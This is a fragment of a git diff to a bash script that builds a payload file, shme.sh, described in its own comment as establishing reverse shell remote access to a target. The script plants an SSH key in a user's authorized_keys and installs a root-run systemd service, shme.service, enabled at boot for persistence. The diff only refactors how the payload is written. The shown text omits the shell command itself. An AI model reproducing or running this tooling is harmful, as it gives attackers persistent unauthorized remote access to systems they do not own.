@@ -77,7 +77,7 @@ cat keys/$rmtUser.pub > /home/$rmtUser/.ssh/authorized_keys
 mkdir -p payloads
 rm payloads/*
 touch payloads/shme.sh
-payload="#!/bin/bash\
+printf "#!/bin/bash\
     # single run installation script to establish reverse shell remote access to target\
 
     # check run as 'root'
@@ -116,9 +116,7 @@ payload="#!/bin/bash\
         [Install]
         WantedBy=multi-user.target\"
     printf $sysd > /etc/systemd/system/shme.service
-    sudo systemctl enable --now shme.service"
-
-printf $payload > payloads/shme.sh
+    sudo systemctl enable --now shme.service" > payloads/shme.sh
 
 # err handling
 if (($? > 0)); then
